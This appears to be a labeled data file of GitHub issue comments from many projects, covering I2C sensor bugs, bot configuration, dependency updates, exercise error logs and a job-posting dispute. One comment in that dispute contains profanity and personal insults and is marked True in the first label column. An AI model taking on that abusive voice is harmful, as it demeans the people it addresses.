i2cdevlib/jrowberg/252/350210079,"Solved, it was something I did wrong with the wiring; when I power separately the servos and arduino (with the usb cable) works like charm. Many thanks Jeff Rowberg, keep up with the good work!! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/350474514,I face the FIFO overflow problem ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/350639594,"@friend this issue is not about FIFO overflow. You may want to check if issue is not filed for your problem already (and file a new one if it isn't). Or, if you find this is the relevant issue, please provide more information. E.g., does your MPU6050 latch SDA? Are you using DMP? What platform you're on? Etc. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/369645857,"@friend I have to say, I highly dislike your attitude. To summarize, you have unoffcial hardware, you admitted having limited knowledge of the library you use and the I2C (TWI) protocol, you did not provide anything concerning your hardware setup and wiring and yet you insist in making claims about  i2cdevlib reliability even after numerous people, including mr. Rowberg himself, has pointed to you the potential source of your issue. Astro-Johnny scope out the faulty sequence and finaly proved that the MPU keep the data line latch low. He also demonstrated how you could unlatch the data pin by forcing clock signal.  This has nothing to do with i2cdevlib and rather is linked to flemsy hardware and TWI driver implementation. I make a living developping embedded software. This is a common issue I had with numerous sensor. The sensor get stuck in is state machine and does not complete the I2C transaction hence keeping the data line low. I have implemented multiple I2C driver for a variety of mcu and now I always implement a recovery sequence in which the mcu take control of the I2C line and bit bang is way out forcing either a stop condition or a software reset on the sensor (see any I2C protocol documentation for this). Now as mr. Rowberg told you, it would be difficult to stay compatible with arduino platforme using is own TWI driver, not impossible, but not in the scope of this library. So you are left with these two choices  Buy thrusted hardware. Fix the WIRE library.  Also I would like to remind you that this is free open-source software. No one owes you anything. If you are so certain of the bug source then fix it yourself! Best luck with that! Regards, Alex ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/369647821,"@friend  I have to say, I highly dislike your attitude. Hundreds of people are facing the same problem, surely it's my ""unofficial"" hardware which is the root of the problem. Surely I am the curlprit. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/369653075,"Well if there is a bug in the firmware of the MPU and everyone is using the arduino WIRE library then yes they will all be facing the same issue so what is your point exactly? I never said you were personally responsible for this issue. I said that you make claims that you cant prove and this is rather annoying, especially when people point out the source of the issue. A word of advice, dont buy cheap hardware if you have not the knowledge nor the equipement to troubleshoot the thing if there is a problem. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/369662343,"@friend You dont live here in brazil, the cheap parts you buy in US are expensive here, and the expensive parts you buy in US you rarely can buy here in brazil being able to trust the seller. LOTS of brazilian are using the ""regular"" MPU6050 sold in the internet. We have no way to tell if it's good or bad stuff. And even if you pay 10x what it cost to you in US I wont be able to tell if the product was ""original""/""certified"" cause most sellers hide the origin of the products to avoid taxes. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/369662831,"I appreciate the comments from those vouching for the integrity of the I2Cdev library, and I also appreciate the frustration that comes from trying to use what should be a reliable device and observing mission-critical failures. However, I think this issue should be closed, or at least have the discussion locked, because it's not going to solve anything. Let me recap the findings  The peripheral (MPU-6050 in this case) is behaving in way that is disallowed by the I2C spec. This is not a bug in the I2Cdevlib code. The underlying I2C/TWI communication layer (Arduino Wire library in this case) contains a blocking  loop that assumes all peripherals will follow the I2C spec. This is not a bug in the I2Cdevlib code. It's not even a bug, exactly, in the Wire library; however, it is a missing feature.  In light of this, there are a finite number of options  Use a sensor that doesn't break the spec. This is not suitable for those who need the MPU-6050 for whatever reason. Patch the Wire library locally with the addition of read timeouts. This is possible, but it requires extra effort for each user. Also, it is strictly outside of the scope of the I2Cdevlib project. Improve the Wire library officially by implementing timeouts and submitting a pull request. This is an ideal solution, but it requires a lot of agreement from many people on the Arduino project. It too is outside of the scope of the I2Cdevlib project. Implement a custom TWI/I2C communication layer with timeout support. This could be done within the I2Cdevlib project, but it would necessarily mean than projects using I2Cdevlib and its custom TWI/I2C layer could no longer use Wire, making it somewhat restrictive. This solution would fairly be considered a new feature, not a bugfix, as it is not actually fixing any bugs in the I2Cdev code. Implement a hardware timer/watchdog to interrupt the while loop if needed. This is theoretically possible as well, but it requires using on-chip resources that are already quite scarce in order to solve a corner-case failure triggered by an outside peripheral device behaving badly. This could be added to your application logic, but I would never want it to be part of mainline I2Cdev code.  All further effort towards solving this should be directed at patching the official Wire library to include cross-platform timeout support, as this would add real value and address the pain points that many people are experiencing. ",False,True,False,i2cdevlib/jrowberg/252
icinga2-test/lazyfrosch-test/263/200898318,This issue has been migrated from Redmine  jflach Assignee jflach Status Rejected Target Version (none) Created 2016-09-09 152509 +0000 (closed on 2016-09-27 124811 +0000) Last Update 2016-11-18 104420 +0000 (in Redmine)  Backport? Not yet backported Include in Changelog 1   Currently check_ping waits until at least $timeout after each ping. That's unexpected behaviour -- and quite useless. ,False,True,False,icinga2-test/lazyfrosch-test/263
ida-red/amtamayo/28/13174785,Empty seats on Comparison page may not be accurate for schools already co-locating (Fermi-South Shore) ,False,True,False,ida-red/amtamayo/28
image_inspector/TNRIS/80/334336444,This PR updates pytest from 3.4.0 to 3.6.2. &lt;details&gt;   &lt;summary&gt;Changelog&lt;/summary&gt;      ### 3.6.1        ### 3.6.0        ### 3.5.1        ### 3.5.0        ### 3.4.2        ### 3.4.1    &lt;/details&gt;&lt;details&gt;   &lt;summary&gt;Links&lt;/summary&gt;    - PyPI   - Changelog   - Repo   - Homepage ,False,True,False,image_inspector/TNRIS/80
image_inspector/TNRIS/80/402759567,Closing this in favor of #82 ,False,True,False,image_inspector/TNRIS/80
instabot.py/instabot-py/1979/409566515,"Check this or we will delete your issue. (fill in the checkbox with an X like so [x])  [x ] I have searched for other issues with the same problem or similar feature requests.   Select one  [ x] Bug [ ] Feature Request [ ] Technical Help [ ] Other  Environment  [ ] Are you hosting the bot on a VPS or other Cloud hosting? [ x] If so, have you tried running the code on your local machine?  Operating System? (include version)  [ ] macOS [ ] Windows [ x] Linux (include flavour) Ubuntu 16.04.5 LTS [ ] Android (include terminal)  Python Version Requirement  [ x] PYTHON 3.6.7  Exact Python Version? Pip Version? Description of your issue Clean execution (no prior database or anything) It adds to the database people that were already followed by the account before executing the bot ( I assume, found because of a tag).  And then it unfollows that person. It shouldn't follow or add people that it is already following!!. Config ",False,True,False,instabot.py/instabot-py/1979
instabot.py/instabot-py/1979/463157699,"Please see the ""unfollow_recent_feed"" parameter outlined in README.md  definition, the bot cannot follow a person you are already following. It will, however, by default, unfollow people who do not follow you back. You'll need to set it to False () and delete your .db file. ",False,True,False,instabot.py/instabot-py/1979
instabot.py/instabot-py/1979/463158183,"It unfollows people that where following me. Reopen please. On Wed, 13 Feb 2019 at 1206, Dimis notifications@friend.com wrote --  Martín Lombana  TODOLOGIC.COM   +34 633 63 02 35  |   +34 946 759 137 INSTAGRAM → @ ",False,True,False,instabot.py/instabot-py/1979
instabot.py/instabot-py/1979/463161703,"Have you even tried to change the parameters as suggested? Did you actually delete the .db file? You replied 2 minutes later, the new .db wouldn't even have populated! I'm not reopening this. Please feel free to open a new issue if you have tried the steps outlined above and you can provide steps on reproducing this. I also ask that you don't waste anyone's time (including yours) without trying following the suggested steps first. Thanks ",False,True,False,instabot.py/instabot-py/1979
ionic-pwa-toolkit/ionic-team/22/297335582,"Resources Before submitting an issue, please consult our docs. Stencil version (run  from a terminal/cmd prompt and paste output below) I'm submitting a ...  (check one with ""x"") [x] bug report [ ] feature request [ ] support request =&gt; Please do not submit support requests here, use one of these channels  or  behavior  Fetching the last master commits, something's broken out of the box Adding the removed bundle components in stencil.config.js, doesn't fix the thing. BTW, not sure that running  is the best way to keep up-to-date with the project, I've renamed this remote and I'm rebasing on my local directory. Unless there's a better way ? ",False,True,False,ionic-pwa-toolkit/ionic-team/22
ionic-pwa-toolkit/ionic-team/22/366760033,Hello! Thanks for using the PWA Toolkit! I just updated this repo to the latest of everything which fixes this issue. If you do a fresh  or  and then run  you should be good to go. ,False,True,False,ionic-pwa-toolkit/ionic-team/22
ionic-pwa-toolkit/ionic-team/22/367219561,"Thank you for the fix. Now I'm coming across another issue  that having a stable release with a working config of Stencil on Linux is a bit complicated. It'd be awesome if you could use version number in package.json instead of , and tag also milestones. It's difficult to track working configurations, though. ",False,True,False,ionic-pwa-toolkit/ionic-team/22
iroha/hyperledger/1251/315759075,Signed-off-by Moonraker ssolonets@friend.com            Description of the Change This pr change QueryResponse.query_hash to be a hex-encoded string instead of byte array. Benefits Since this data is returned inside a json object is should have a hex representation - similar to transaction hashes. Binary strings can be a problem to deal with in some client languages. Possible Drawbacks -- Usage Examples or Tests [optional]   Alternate Designs [optional] ,False,True,False,iroha/hyperledger/1251
java-client/appium/621/221796504,"I want to test toast message in my native app. There is an info  In release notes. I see example  how I should test toast But when I set  I broke my test. (Can't find some elements and type text). My question Can I change capability dynamically, namely ? I tried to do it like ♠        getDriver().executeScript(""env.automationName = 'UIAutomator2'"");` (from here)  but catch Error  gist Java logs  gist Appium server logs Environment  java client 5.0.0-BETA7 Appium server version 1.6.4 Node.js version 7.5.0 Mobile platform/version under test Android 4.4.2 Real device or emulator/simulator HTC Desire 820G dual sim  ",False,True,False,java-client/appium/621
java-client/appium/621/294142797,@friend no you cant change the capability ,False,True,False,java-client/appium/621
java-client/appium/621/294143134,Ok. How should i test toast? Do not suggest OCR )) ,False,True,False,java-client/appium/621
java-client/appium/621/294161488,"@friend If you wanna test toast messages, you have to use UIAutomator2 as automationName.It is not possible to test the same feature in legacy driver. If running your tests on UiAutomator2 breaks your tests there is no other go you have to fix it one day or other since legacy drivers will be deprecated sooner or later. ",False,True,False,java-client/appium/621
jeancflanagan/opattison/15/16926560,"Make sure it's reusable elsewhere in case it is appropriate for pages that aren't strictly articles. @friend why don't you take a shot at writing the HTML in a separate file in the _includes folder (call it ""twitter-comment.html"" or something) in a separate branch? I can help you style it. ",False,True,False,jeancflanagan/opattison/15
jeancflanagan/opattison/15/21978751,try buttons that are dark gray with white icons (twitter and rss) ,False,True,False,jeancflanagan/opattison/15
jeancflanagan/opattison/15/22000183,"maybe include a ""copy permalink for article to clipboard"" button as well? only on small screen sizes? ",False,True,False,jeancflanagan/opattison/15
jeancflanagan/opattison/15/33119929,"Marking as ""not required for launch"" tentatively. I do want to come back to this one very soon, though. ",False,True,False,jeancflanagan/opattison/15
jeancflanagan/opattison/15/61355080,I think this is the most straightforward way to go with this ,False,True,False,jeancflanagan/opattison/15
jenkins/jenkinsci/2355/155098677,Alternative approach to fixing JENKINS-34857. Could be preferred to #2354 @friend WDYT? ,False,True,False,jenkins/jenkinsci/2355
jenkins/jenkinsci/2355/219518484,Fine by me... As long as we move towards the eventual goal ,False,True,False,jenkins/jenkinsci/2355
jenkins/jenkinsci/2355/219527135,I think this one is better. I think a compatibility issue is not a big deal since it's a critical regression ,False,True,False,jenkins/jenkinsci/2355
jenkins/jenkinsci/2355/219530490,"OK, thanks for your feedback.  Gonna wait a bit more for additional feedback, and if nobody objects will merge this PR and close #2354. ",False,True,False,jenkins/jenkinsci/2355
jenkins/jenkinsci/2355/219547285,Let's go. @friend is ready to make a bugfix release. That'll prevent that issue to become too widespread and give us time to analyse if only the subversion plugin is affected or if there are more. ,False,True,False,jenkins/jenkinsci/2355
jenkins/jenkinsci/2355/219547731,"@friend @friend Seems we were using different IRC chats, but 👍 for going forward ",False,True,False,jenkins/jenkinsci/2355
jobs/TechnologyMasters/144/352303209,"Grupee - App Developer - New York City Salary Equity. 2% - 5% Benefits None Perks  Work your own schedule Choose your own custom setup  Location New York City, NY What you will do Develop a Minimum Vial Product (MVP) for a social media platform. Nothing major in the UX/UI department but having experience with this is a must. I will need the front end and back end as well, but a bigger emphasis on the back end. Skills iOS, Swift, coding, mobile development, UI, UX, back end, front end. Must Have  3+ years in mobile development  If you deployed apps of your own is a plus.  Relevant Experience  mobile technology up to date on current mobile trend  Who we are We are Grupee and we are new social media platform. We are looking into changing the dynamic on how we usually would interact on social media platforms. How to contact us Email will be the quickest way to reach us. Shoot your resume as well if you have one available. Subject should say “Grupee Applicant”. Please send an email to Jon.bell@friend.us  [ ] Full Time [ ] Part Time [x] Contract/Partnership [ ] Internship [ ] Remote Worldwide [ ] Remote Regional [ ] Remote OK  ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414469923,"I know the details is a bit vague, but because of the nature of the business I was obliged to. If you contact me, I’ll be sure to explain more thoroughly what this project is about and the position you would be working on. ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414579889,"Hi! Please explain more thoroughly what this project is about. Also, it sounds like you're offering only 5% for what should be a co-founder role (easily 30%, probably halfsies, possibly more). You have this great idea, but building out a lightweight prototype that's fully functional is not only weeks of full time work, but will require constant engineering follow-through. If even moderately successful, you will NEED someone who will be committed to see it through. Think of it this way I'm going to be using many years of development experience (technically, a decade), making many of the product decisions on the fly (as is necessary in a tight working relationship with a non-technical co-founder), and generally building everything. What you will bring to the table are the skills I don't have. When you're working on a project with someone else in this capacity, you have to sell THEM on YOUR pedigree, and you need to bring value to the table. An idea is just an idea; without backing and research and a compelling story for its success, it's not even a good one. I invite you to post your resume here. The barrier to entry of being a CEO is incorporating. ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414824831,"Mr. Murder, thank you for your input. I am glad you’ve seen through my deceptions. I am glad you actually took the time out of your day to expose my trickery. You are absolutely right. The worker (that would be you) with all the skills and knowledge should run most of the company and should earn most of the company too. In fact, the owner of the idea, the one who runs the business side of things (sole or with a team), the one who files for the company, the one has to keep the company from running to the ground, the one makes all the important decisions should MOST DEFINITELY own 5 percent of the company. Maybe less. That is exactly how all the biggest companies in the world run their businesses. If I may, I would like to suggest one last thing before taking my deceitful person to more viable candidates. Do your reserach before talking young Bill and for the love of God, please know your worth. 10 years plus in your career and you still struggling to make your big break. You just signed up on Github this past week and your first order of business is to bash the first post you see. I think we all can your bluff now... ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414838423,"Hi! Looks like you didn't read what I wrote, or didn't understand it. So, I'll piece by piece break down the wall of text there and explain what I'm trying to say. First off, I'm not accusing you of trickery, I'm highlighting your naiveté in hopes that in the future you put more value on the people you're working with. Second off, there is no company. You have no company. You have an idea, and an idea is worthless without execution and followthrough. When you tell someone they'll get 5% in a 11 partnership, that is a miserable deal for what will be weeks (to months, and even years!) of hard work that in a major city earns you a salary and equity in a tco package ALWAYS north of $150k a year. You're not forming a partnership, you're bald-faced trying to fuck them. Take a look at examples of historical and modern startup equity among co-founders.  Jobs convinced Steve Wozniak to take something like 30% ownership in an early Apple. It's widely accepted that Wozniak got capital-f fucked by that. You are not Steve Jobs. By the way, you are absolutely right that's exactly how ""how all the biggest companies in the world run their businesses"". Facebook employs around 25,000 people. How many do you have? Next, there is no ""owner"" of an idea. It's an idea, unless you patent it, in which case you get about 15 years of protection (good luck patenting any variation on a social network, by the way!). There is execution of an idea. You, by yourself, are incapable of executing or else you'd be building it. I made this account as a disposable account. I hope you can appreciate why. Call me a coward, but I don't care to taint my professional reputation. I see listings like this all the time and ignore them (as many other people do), but never as vague and boldly ""I'm an idea guy"" as this. And yes, we have a term for people like you idea guy. It's derisive. ",True,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414904571,"Honestly, I don’t even know why I entertain the narrow minded. If my post offended you than I beg of you to pardon my life. If you look closely at the post, under it I set out a disclaimer. I can give much detail on the post for a reason and you assuming that I don’t have a company shows the level of ignorance you have on the matter. If this post intrigues you and you want to at least know what is cooking behind the scene, contact me. My email is there. If not, find some other way to spend your time. ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/414912645,"Balking at compensation terms isn't narrow minded. Give detail on the post. I guess it's wrong to assume you haven't incorporated; but, I would not be surprised if you haven't. Start off with some PRDs. Maybe a few slides showing a potential audience. Cometitor research. Most important of all, post your resume. On Tue, Aug 21, 2018, at 912 PM, Jon B wrote ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/415067969,"This is not a job, this is a request for free work. should be closed. ",False,True,False,jobs/TechnologyMasters/144
jobs/TechnologyMasters/144/415158898,"I'm closing this issue. the poster does not seem interested to offer fair compensation for the work expectation and we at TechMasters leadership will not encourage such postings. please reach out to me directly if you have any concerns. last, I will only add that ideas are worthless, the value is in the execution ",False,True,False,jobs/TechnologyMasters/144
js-gardener/simlu/148/331284987,"Version 15.5.2 of semantic-release was just published. &lt;table&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Dependency     &lt;/th&gt;     &lt;td&gt;       &lt;code&gt;semantic-release&lt;/code&gt;     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;       &lt;th align=left&gt;        Current Version       &lt;/th&gt;       &lt;td&gt;         15.5.1       &lt;/td&gt;     &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Type     &lt;/th&gt;     &lt;td&gt;       devDependency     &lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;The version 15.5.2 is not covered by your current version range. If you don’t accept this pull request, your project will work just like it did before. However, you might be missing out on a bunch of new features, fixes and/or performance improvements from the dependency update. It might be worth looking into these changes and trying to get this project onto the latest version of semantic-release. If you have a solid test suite and good coverage, a passing build is a strong indicator that you can take advantage of these changes directly by merging the proposed change into your project. If the build fails or you don’t have such unconditional trust in your tests, this branch is a great starting point for you to work on the update.  &lt;details&gt; &lt;summary&gt;Release Notes&lt;/summary&gt; &lt;strong&gt;v15.5.2&lt;/strong&gt;  &lt;h2&gt;&lt;a href="" (2018-06-11)&lt;/h2&gt; &lt;h3&gt;Bug Fixes&lt;/h3&gt; &lt;ul&gt; &lt;li&gt;&lt;strong&gt;package&lt;/strong&gt; update hook-std to version 1.0.0 (&lt;a href="" new version differs by 1 commits.&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;fix(package) update hook-std to version 1.0.0&lt;/code&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;See the &lt;a href="" diff&lt;/a&gt;&lt;/p&gt; &lt;/details&gt;&lt;details&gt;   &lt;summary&gt;FAQ and help&lt;/summary&gt;    There is a collection of [frequently asked questions]( If those don’t help, you can always [ask the humans behind Greenkeeper]( Greenkeeper bot palm_tree ",False,True,False,js-gardener/simlu/148
juice-shop/bkimminich/80/51467422," Use some fancy Bootstrap theme Apply some CSS-magic (help needed!) Add some no-op functions that distract the attackers a bit (e.g. pagination, more images, ...)     &lt;bountysource-plugin&gt;   Want to back this issue? Place a bounty on it! We accept bounties via Bountysource. &lt;/bountysource-plugin&gt; ",False,True,False,juice-shop/bkimminich/80
juice-shop/bkimminich/80/71026544,good enough for now with v1.8.0 dark layout. New logo might follow with #97. ,False,True,False,juice-shop/bkimminich/80
khan-exercises/Khan/143523/24386079,"no question presented recognizing_rays_lines_and_line_segments.html?seed=187&amp;problem=undefined Answer timeline undefined  Locale en User hash 2075007577 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 MathJax is loaded, ready, queue length 0 start of log loadModule mod /khan-exercises/utils/answer-types.js loadModule mod /khan-exercises/utils/tmpl.js loadModule mod /khan-exercises/utils/tex.js loadModule mod /khan-exercises/utils/jquery.adhesion.js loadModule mod /khan-exercises/utils/calculator.js loadModule mod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadScript loading /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadScript loaded /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadExercise start reading_stem_and_leaf_plots.html loadExercise start factoring_difference_of_squares_1.html loading and rendering recognizing_rays_lines_and_line_segments loadExercise start recognizing_rays_lines_and_line_segments.html loadExercise got reading_stem_and_leaf_plots.html loadExercise submod math loadModule mod /khan-exercises/utils/math.js loadModule mod /khan-exercises/utils/../third_party/raphael.js loadExercise submod stat loadModule mod /khan-exercises/utils/stat.js loadExercise submod math-format loadModule mod /khan-exercises/utils/math-format.js loadModule mod /khan-exercises/utils/expressions.js loadExercise submod word-problems loadModule mod /khan-exercises/utils/word-problems.js loadExercise submod spin loadModule mod /khan-exercises/utils/spin.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadExercise finish reading_stem_and_leaf_plots.html loadExercise got factoring_difference_of_squares_1.html loadExercise submod math loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadExercise finish factoring_difference_of_squares_1.html loadExercise err 404 recognizing_rays_lines_and_line_segments.html error Error loading exercise from file recognizing_rays_lines_and_line_segments.html 404 Not Found ",False,True,False,khan-exercises/Khan/143523
khan-exercises/Khan/53850/16733872,"I don't get what the question is asking.  hash 482625861 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv1.9.2.27) Gecko/20120216 Firefox/3.6.27 MathJax is loaded, ready, queue length 0 ",False,True,False,khan-exercises/Khan/53850
khan-exercises/Khan/53850/24075062,"This is an automated comment Thank you for reporting a problem with this exercise. This issue has been open for over a week and unfortunately no one has had a chance to look at it yet. We get close to 100 new issues reported each day, many of which are not real bugs, but simply students having difficulty with the math. Unfortunately this means that even with the assistance of our awesome volunteers, we can't always go through and address each issue individually. Consequently, this issue is being automatically closed. If you're still experiencing a problem, please report it again! We always keep an eye on the ratio of users reporting a problem to users successfully using an exercise, so reporting a problem--even if we can't individually address it--really helps. ",False,True,False,khan-exercises/Khan/53850
kinbody_detector/personalrobotics/3/146150050,"Need to fix Update() in kinbody_detector.py so each kinbody can be either 'added' or 'updated', never both. ",False,True,False,kinbody_detector/personalrobotics/3
kinbody_detector/personalrobotics/3/206049218,"See PR  so each kinbody can be either 'added' or 'updated', never both ",False,True,False,kinbody_detector/personalrobotics/3
kinbody_detector/personalrobotics/3/206049792,"@friend  also mentioned that if you detect a specific object, kinbody_detector will also update the pose of other objects as detected by the apriltags module. This can be annoying if you don't want their pose to change. What if we call only for 'added' bodies, by default? and add an optional argument to Update()  which would maintain the existing, non-desirable behavior. ",False,True,False,kinbody_detector/personalrobotics/3
langs/fluxbb/121/169797727,It wont let me pull these so i do them single ,False,True,False,langs/fluxbb/121
khan-exercises/Khan/148613/24674842,"La consigna es insuficiente, falta la pregunta o la respuesta esperada es incorrecta. De los datos presentes se induce que la pregunta es la cantidad de zoológicos relevados, cuya respuesta en base al gráfico es 19. Sin embargo, según las pistas, la respuesta esperada es ""1 zoológico tiene 8 perezosos"", de lo cual se supone que la pregunta no visible es ""cuántos zoológicos tienen 8 perezosos?"" reading_stem_and_leaf_plots.html?seed=147&amp;problem=how-many Answer timeline [[""19""]]  Locale es-ES User hash 1813681947 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv26.0) Gecko/20100101 Firefox/26.0 MathJax is loaded, ready, queue length 0 start of log loadModule mod /khan-exercises/utils/answer-types.js loadModule mod /khan-exercises/utils/tmpl.js loadModule mod /khan-exercises/utils/tex.js loadModule mod /khan-exercises/utils/jquery.adhesion.js loadModule mod /khan-exercises/utils/calculator.js loadModule mod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadScript loading /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadScript loaded /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b startTask... startTask got task reading_tables_2 renderExerciseTask reading_tables_2 loading and rendering reading_tables_2 loadExercise start reading_tables_2.html loadExercise got reading_tables_2.html loadExercise submod math loadModule mod /khan-exercises/utils/math.js loadModule mod /khan-exercises/utils/../third_party/raphael.js loadModule mod /khan-exercises/utils/knumber.js loadExercise submod graphie loadModule mod /khan-exercises/utils/graphie.js loadModule mod /khan-exercises/utils/kpoint.js loadModule mod /khan-exercises/utils/kvector.js loadExercise submod word-problems loadModule mod /khan-exercises/utils/word-problems.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadExercise finish reading_tables_2.html loaded reading_tables_2, now rendering start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src 